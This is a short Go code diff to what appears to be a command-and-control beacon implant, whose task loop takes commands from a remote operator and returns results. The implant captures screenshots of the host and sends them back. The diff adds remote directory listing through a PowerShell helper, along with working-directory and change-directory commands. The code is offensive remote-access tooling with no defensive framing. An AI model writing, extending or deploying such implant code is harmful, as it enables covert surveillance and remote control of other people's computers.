@@ -18,6 +18,8 @@ import (
 	"github.com/vova616/screenshot"
 )
 
+var PWD, _ = hg.GetPwd()
+
 func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string, key []byte, beacon_name string, rhost string, url string) {
 	for _, task := range tasksToDo {
 		var data string
@@ -85,6 +87,7 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 				hg.DeleteFile("./temp.png")
 				break
 			}
+			file.Close()
 
 			filename := "ss_" + fmt.Sprintf("%d", time.Now().Unix()) + ".png"
 			data = fmt.Sprintf("screenshot saved as (%s)", filename)
@@ -95,6 +98,13 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 			data += fileData
 
 			hg.DeleteFile("./temp.png")
+		case "pwd":
+			data = PWD
+		case "ls":
+			data, _ = hg.PsReturn("dir " + taskData)
+		case "cd":
+			os.Chdir(taskData)
+			data = fmt.Sprintf("changed directory to %s", taskData)
 		default:
 			data = "command not supported"
 		}
